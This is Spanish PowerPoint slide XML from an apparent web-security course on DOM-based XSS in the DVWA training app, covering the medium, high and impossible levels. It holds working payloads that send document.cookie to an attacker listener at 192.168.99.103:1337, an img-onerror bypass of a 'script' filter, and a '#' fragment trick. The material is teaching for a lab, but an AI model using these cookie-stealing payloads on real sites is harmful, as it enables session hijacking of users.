      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5BFA20D-6818-421E-B1DE-4A37A34B161C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="767408" y="1120018"/>
            <a:ext cx="10585176" cy="497327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Se abre servicio de escucha en el atacante (dependiendo versión de Python)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>python</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> 1234</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>python2 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>SimpleHTTPServer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> 1337</a:t>
            </a:r>
          </a:p>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Se envía URL a la víctima</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=&lt;script&gt;window.location='http://127.0.0.1:1337/?cookie='+document.cookie&lt;/script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="14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s-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Imagen 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CFA6E103-930B-407B-A691-4A61A7DBC2ED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="695400" y="4365104"/>
            <a:ext cx="10946428" cy="1224136"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41658497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23392" y="476008"/>
            <a:ext cx="8784976" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección XSS DOM Robando la cookie-Medium</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5BFA20D-6818-421E-B1DE-4A37A34B161C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="767408" y="1120018"/>
            <a:ext cx="6192688" cy="65279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Protegemos código para evitar la palabra “script”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-E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s-E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s-E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Nos lo saltamos con el siguiente comando</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>&lt;/select&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00FF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>&lt;img </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00FF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00FF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00FF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>onerror</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00FF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00FF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>window.location</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00FF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>='http://192.168.99.103:1337?cookie='+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00FF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00FF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>&gt;</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342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Y </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>el</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>atancante</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>vemos</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> la cookie</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="14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s-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Imagen 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B543AB2B-D259-40C1-9EDD-A8BC9D220579}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6931522" y="1052736"/>
            <a:ext cx="4953691" cy="1343212"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Imagen 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C7198DD3-12E3-4889-91E2-291F199AD7F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="839416" y="5013176"/>
            <a:ext cx="10912005" cy="1224136"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36342566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23392" y="476008"/>
            <a:ext cx="8784976" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección XSS DOM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>high</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5BFA20D-6818-421E-B1DE-4A37A34B161C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="767408" y="1120018"/>
            <a:ext cx="6120680" cy="65279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Protegemos código y solo dejamos pasar ciertas palabras, el resto actúa el default</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-E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s-E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Lo rompemos usando el “#”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://localhost/dvwa/vulnerabilities/xss_d/?default=English</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>&lt;script&gt;alert(1)&lt;/script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-U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n-U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n-U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n-U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n-U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n-U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n-US" sz="2000"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s-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{666B130C-5AC7-46D9-AA72-8863D5EB8242}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7176119" y="980728"/>
            <a:ext cx="4366849" cy="2582545"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Imagen 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{090C6006-5425-4290-A0B3-923B8397883C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6056179" y="3379190"/>
            <a:ext cx="5727113" cy="1656185"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4578468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23392" y="476008"/>
            <a:ext cx="8784976" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección XSS DOM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>impossible</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5BFA20D-6818-421E-B1DE-4A37A34B161C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="767408" y="1120018"/>
            <a:ext cx="6120680" cy="65279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n-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>En </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>el</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> impossible la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
